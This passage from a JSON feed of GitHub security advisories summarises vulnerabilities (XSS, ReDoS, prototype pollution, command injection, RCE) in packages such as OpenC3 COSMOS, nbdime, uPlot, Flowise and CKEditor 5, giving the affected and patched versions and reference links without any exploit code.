            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The login functionality contains a reflected cross-site scripting (XSS) vulnerability.</p>\n<p>Note: This CVE only affects Open Source Edition, and not OpenC3 COSMOS Enterprise Edition</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead up to Remote Code Execution (RCE).</p>\n<p><strong>NOTE:</strong> The complete advisory with much more information is added as <a href=\"https://github.com/OpenC3/cosmos/security/advisories/GHSA-vfj8-5pj7-2f9g#advisory-comment-104904\">comment</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenC3/cosmos/security/advisories/GHSA-vfj8-5pj7-2f9g\">https://github.com/OpenC3/cosmos/security/advisories/GHSA-vfj8-5pj7-2f9g</a></li>\n<li><a href=\"https://github.com/OpenC3/cosmos/commit/762d7e0e93bdc2f340b1e42acccedc78994a576e\">https://github.com/OpenC3/cosmos/commit/762d7e0e93bdc2f340b1e42acccedc78994a576e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43795\">https://nvd.nist.gov/vuln/detail/CVE-2024-43795</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfj8-5pj7-2f9g\">https://github.com/advisories/GHSA-vfj8-5pj7-2f9g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfj8-5pj7-2f9g",
            "title": "[@openc3/tool-common] OpenC3 Cross-site Scripting in Login functionality (`GHSL-2024-128`)",
            "date_modified": "2024-10-02T21:41:43.000Z",
            "date_published": "2024-10-02T19:29:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfj8-5pj7-2f9g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Version of <code>is-my-json-valid</code> before 1.4.1 or 2.17.2 are vulnerable to regular expression denial of service (ReDoS) via the email validation function.</p>\n<h2 id=\"recommendation\">Recommendation</h2>\n<p>Update to version 1.4.1, 2.17.2 or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-2537\">https://nvd.nist.gov/vuln/detail/CVE-2016-2537</a></li>\n<li><a href=\"https://github.com/mafintosh/is-my-json-valid/pull/159\">https://github.com/mafintosh/is-my-json-valid/pull/159</a></li>\n<li><a href=\"https://github.com/mafintosh/is-my-json-valid/commit/b3051b277f7caa08cd2edc6f74f50aeda65d2976\">https://github.com/mafintosh/is-my-json-valid/commit/b3051b277f7caa08cd2edc6f74f50aeda65d2976</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f522-ffg8-j8r6\">https://github.com/advisories/GHSA-f522-ffg8-j8r6</a></li>\n<li><a href=\"https://www.npmjs.com/advisories/572\">https://www.npmjs.com/advisories/572</a></li>\n<li><a href=\"https://www.npmjs.com/advisories/76\">https://www.npmjs.com/advisories/76</a></li>\n<li><a href=\"https://hackerone.com/reports/317548\">https://hackerone.com/reports/317548</a></li>\n<li><a href=\"https://github.com/mafintosh/is-my-json-valid/commit/eca4beb21e61877d76fdf6bea771f72f39544d9b\">https://github.com/mafintosh/is-my-json-valid/commit/eca4beb21e61877d76fdf6bea771f72f39544d9b</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/4850\">https://github.com/github/advisory-database/pull/4850</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f522-ffg8-j8r6",
            "title": "[is-my-json-valid] Regular Expression Denial of Service in is-my-json-valid",
            "date_modified": "2024-10-02T17:16:13.000Z",
            "date_published": "2017-10-24T18:33:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f522-ffg8-j8r6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>\n<h4 id=\"python\">Python</h4>\n<ul>\n<li>nbdime 1.x: Patched in v. 1.1.1</li>\n<li>nbdime 2.x: Patched in v. 2.1.1</li>\n<li>nbdime 3.x: Patched in v. 3.1.1</li>\n</ul>\n<h4 id=\"npm\">npm</h4>\n<ul>\n<li>nbdime 6.x version: Patched in 6.1.2</li>\n<li>nbdime 5.x version: Patched in 5.0.2</li>\n<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>\n<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory email us at <a href=\"mailto:security@ipython.org\">security@ipython.org</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n<li><a href=\"https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea\">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41134\">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4",
            "title": "[nbdime-jupyterlab] Stored XSS in Jupyter nbdime",
            "date_modified": "2024-10-01T19:31:58.000Z",
            "date_published": "2021-11-08T18:09:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>\n<h4 id=\"python\">Python</h4>\n<ul>\n<li>nbdime 1.x: Patched in v. 1.1.1</li>\n<li>nbdime 2.x: Patched in v. 2.1.1</li>\n<li>nbdime 3.x: Patched in v. 3.1.1</li>\n</ul>\n<h4 id=\"npm\">npm</h4>\n<ul>\n<li>nbdime 6.x version: Patched in 6.1.2</li>\n<li>nbdime 5.x version: Patched in 5.0.2</li>\n<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>\n<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory email us at <a href=\"mailto:security@ipython.org\">security@ipython.org</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n<li><a href=\"https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea\">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41134\">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4",
            "title": "[nbdime-jupyterlab] Stored XSS in Jupyter nbdime",
            "date_modified": "2024-10-01T19:31:58.000Z",
            "date_published": "2021-11-08T18:09:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>\n<h4 id=\"python\">Python</h4>\n<ul>\n<li>nbdime 1.x: Patched in v. 1.1.1</li>\n<li>nbdime 2.x: Patched in v. 2.1.1</li>\n<li>nbdime 3.x: Patched in v. 3.1.1</li>\n</ul>\n<h4 id=\"npm\">npm</h4>\n<ul>\n<li>nbdime 6.x version: Patched in 6.1.2</li>\n<li>nbdime 5.x version: Patched in 5.0.2</li>\n<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>\n<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory email us at <a href=\"mailto:security@ipython.org\">security@ipython.org</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n<li><a href=\"https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea\">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41134\">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4",
            "title": "[nbdime] Stored XSS in Jupyter nbdime",
            "date_modified": "2024-10-01T19:31:58.000Z",
            "date_published": "2021-11-08T18:09:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>\n<h4 id=\"python\">Python</h4>\n<ul>\n<li>nbdime 1.x: Patched in v. 1.1.1</li>\n<li>nbdime 2.x: Patched in v. 2.1.1</li>\n<li>nbdime 3.x: Patched in v. 3.1.1</li>\n</ul>\n<h4 id=\"npm\">npm</h4>\n<ul>\n<li>nbdime 6.x version: Patched in 6.1.2</li>\n<li>nbdime 5.x version: Patched in 5.0.2</li>\n<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>\n<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory email us at <a href=\"mailto:security@ipython.org\">security@ipython.org</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n<li><a href=\"https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea\">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41134\">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4",
            "title": "[nbdime] Stored XSS in Jupyter nbdime",
            "date_modified": "2024-10-01T19:31:58.000Z",
            "date_published": "2021-11-08T18:09:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package uplot before 1.6.31 are vulnerable to Prototype Pollution via the uplot.assign function due to missing check if the attribute resolves to the object prototype.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21489\">https://nvd.nist.gov/vuln/detail/CVE-2024-21489</a></li>\n<li><a href=\"https://github.com/leeoniya/uPlot/commit/5756e3e9b91270b303157e14bd0174311047d983\">https://github.com/leeoniya/uPlot/commit/5756e3e9b91270b303157e14bd0174311047d983</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-UPLOT-6209224\">https://security.snyk.io/vuln/SNYK-JS-UPLOT-6209224</a></li>\n<li><a href=\"https://github.com/leeoniya/uPlot/blob/c52e5001c1d959a99ac495a53e4deca5c44464d2/src/utils.js#L437-L452\">https://github.com/leeoniya/uPlot/blob/c52e5001c1d959a99ac495a53e4deca5c44464d2/src/utils.js#L437-L452</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-34q8-jcq6-mc37\">https://github.com/advisories/GHSA-34q8-jcq6-mc37</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-34q8-jcq6-mc37",
            "title": "[uplot] uPlot Prototype Pollution vulnerability",
            "date_modified": "2024-10-01T18:10:51.000Z",
            "date_published": "2024-10-01T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-34q8-jcq6-mc37"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>All versions of the package git-shallow-clone are vulnerable to Command injection due to missing sanitization or mitigation flags in the process variable of the gitShallowClone function.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21531\">https://nvd.nist.gov/vuln/detail/CVE-2024-21531</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-GITSHALLOWCLONE-3253853\">https://security.snyk.io/vuln/SNYK-JS-GITSHALLOWCLONE-3253853</a></li>\n<li><a href=\"https://github.com/10uei011/git-shallow-clone/blob/master/index.js#L27\">https://github.com/10uei011/git-shallow-clone/blob/master/index.js#L27</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qwrq-vxvw-537r\">https://github.com/advisories/GHSA-qwrq-vxvw-537r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qwrq-vxvw-537r",
            "title": "[git-shallow-clone] git-shallow-clone OS Command Injection vulnerability",
            "date_modified": "2024-10-01T18:10:29.000Z",
            "date_published": "2024-10-01T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qwrq-vxvw-537r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise &lt; 2.1.1 suffers from a Stored Cross-Site vulnerability due to a lack of input sanitization in Flowise Chat Embed &lt; 2.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9148\">https://nvd.nist.gov/vuln/detail/CVE-2024-9148</a></li>\n<li><a href=\"https://www.tenable.com/security/research/tra-2024-40\">https://www.tenable.com/security/research/tra-2024-40</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/commit/8375ebb4ec1ebb2b1295561cc0f63486a29f3fde\">https://github.com/FlowiseAI/Flowise/commit/8375ebb4ec1ebb2b1295561cc0f63486a29f3fde</a></li>\n<li><a href=\"https://github.com/FlowiseAI/FlowiseChatEmbed/commit/6a9645df41371cb69f251038d501ec87b1304c84\">https://github.com/FlowiseAI/FlowiseChatEmbed/commit/6a9645df41371cb69f251038d501ec87b1304c84</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.1.1\">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.1.1</a></li>\n<li><a href=\"https://github.com/FlowiseAI/FlowiseChatEmbed/releases/tag/flowise-embed%402.0.0\">https://github.com/FlowiseAI/FlowiseChatEmbed/releases/tag/flowise-embed%402.0.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5p9-xvxj-64c8\">https://github.com/advisories/GHSA-m5p9-xvxj-64c8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5p9-xvxj-64c8",
            "title": "[flowise] Flowise and Flowise Chat Embed vulnerable to Stored Cross-site Scripting",
            "date_modified": "2024-09-30T20:56:49.000Z",
            "date_published": "2024-09-25T03:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5p9-xvxj-64c8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise &lt; 2.1.1 suffers from a Stored Cross-Site vulnerability due to a lack of input sanitization in Flowise Chat Embed &lt; 2.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9148\">https://nvd.nist.gov/vuln/detail/CVE-2024-9148</a></li>\n<li><a href=\"https://www.tenable.com/security/research/tra-2024-40\">https://www.tenable.com/security/research/tra-2024-40</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/commit/8375ebb4ec1ebb2b1295561cc0f63486a29f3fde\">https://github.com/FlowiseAI/Flowise/commit/8375ebb4ec1ebb2b1295561cc0f63486a29f3fde</a></li>\n<li><a href=\"https://github.com/FlowiseAI/FlowiseChatEmbed/commit/6a9645df41371cb69f251038d501ec87b1304c84\">https://github.com/FlowiseAI/FlowiseChatEmbed/commit/6a9645df41371cb69f251038d501ec87b1304c84</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.1.1\">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.1.1</a></li>\n<li><a href=\"https://github.com/FlowiseAI/FlowiseChatEmbed/releases/tag/flowise-embed%402.0.0\">https://github.com/FlowiseAI/FlowiseChatEmbed/releases/tag/flowise-embed%402.0.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5p9-xvxj-64c8\">https://github.com/advisories/GHSA-m5p9-xvxj-64c8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5p9-xvxj-64c8",
            "title": "[flowise-embed] Flowise and Flowise Chat Embed vulnerable to Stored Cross-site Scripting",
            "date_modified": "2024-09-30T20:56:49.000Z",
            "date_published": "2024-09-25T03:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5p9-xvxj-64c8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>basic-auth-connect &lt;1.1.0 uses a timing-unsafe equality comparison that can leak timing information</p>\n<h3 id=\"patches\">Patches</h3>\n<p>this issue has been fixed in basic-auth-connect 1.1.0</p>\n<h3 id=\"references\">References</h3>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/expressjs/basic-auth-connect/security/advisories/GHSA-7p89-p6hx-q4fw\">https://github.com/expressjs/basic-auth-connect/security/advisories/GHSA-7p89-p6hx-q4fw</a></li>\n<li><a href=\"https://github.com/expressjs/basic-auth-connect/commit/bac1e6a8530e1efd0028800b9b588a37adb0d203\">https://github.com/expressjs/basic-auth-connect/commit/bac1e6a8530e1efd0028800b9b588a37adb0d203</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47178\">https://nvd.nist.gov/vuln/detail/CVE-2024-47178</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7p89-p6hx-q4fw\">https://github.com/advisories/GHSA-7p89-p6hx-q4fw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7p89-p6hx-q4fw",
            "title": "[basic-auth-connect] basic-auth-connect's callback uses time unsafe string comparison",
            "date_modified": "2024-09-30T20:11:41.000Z",
            "date_published": "2024-09-30T17:48:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7p89-p6hx-q4fw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>During a recent internal audit, we identified a Cross-Site Scripting (XSS) vulnerability in the CKEditor 5 clipboard package. This vulnerability could be triggered by a specific user action, leading to unauthorized JavaScript code execution, if the attacker managed to insert a malicious content into the editor, which might happen with a very specific editor configuration.</p>\n<p>This vulnerability affects <strong>only</strong> installations where the editor configuration meets the following criteria:</p>\n<ol>\n<li>The <a href=\"https://ckeditor.com/docs/ckeditor5/latest/getting-started/setup/toolbar.html#block-toolbar\"><strong>Block Toolbar</strong></a> plugin is enabled.</li>\n<li>One of the following plugins is also enabled:<ul>\n<li><a href=\"https://ckeditor.com/docs/ckeditor5/latest/features/html/general-html-support.html\"><strong>General HTML Support</strong></a> with a configuration that permits unsafe markup.</li>\n<li><a href=\"https://ckeditor.com/docs/ckeditor5/latest/features/html/html-embed.html\"><strong>HTML Embed</strong></a>.</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been recognized and patched. The fix will be available in version 43.1.1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>It's highly recommended to update to the version 43.1.1. However, if the update is not an option, we recommend disabling the block toolbar plugin.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Email us at <a href=\"mailto:security@cksource.com\">security@cksource.com</a> if you have any questions or comments about this advisory.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rgg8-g5x8-wr9v\">https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rgg8-g5x8-wr9v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45613\">https://nvd.nist.gov/vuln/detail/CVE-2024-45613</a></li>\n<li><a href=\"https://github.com/ckeditor/ckeditor5/releases/tag/v43.1.1\">https://github.com/ckeditor/ckeditor5/releases/tag/v43.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rgg8-g5x8-wr9v\">https://github.com/advisories/GHSA-rgg8-g5x8-wr9v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rgg8-g5x8-wr9v",
            "title": "[@ckeditor/ckeditor5-clipboard] Cross-site scripting (XSS) in the clipboard package",
            "date_modified": "2024-09-27T19:16:12.000Z",
            "date_published": "2024-09-25T18:13:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rgg8-g5x8-wr9v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A remote command execution (RCE) vulnerability in promptr v6.0.7 allows attackers to execute arbitrary commands via a crafted URL.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-46489\">https://nvd.nist.gov/vuln/detail/CVE-2024-46489</a></li>\n<li><a href=\"https://github.com/VulnSphere/LLMVulnSphere/blob/main/Prompt/promptr/RCE_FC_6.0.7.md\">https://github.com/VulnSphere/LLMVulnSphere/blob/main/Prompt/promptr/RCE_FC_6.0.7.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hwxp-6qf7-q3rc\">https://github.com/advisories/GHSA-hwxp-6qf7-q3rc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hwxp-6qf7-q3rc",
            "title": "[@ifnotnowwhen/promptr] Remote command execution in promptr",
            "date_modified": "2024-09-26T22:21:19.000Z",
            "date_published": "2024-09-25T18:31:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hwxp-6qf7-q3rc"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}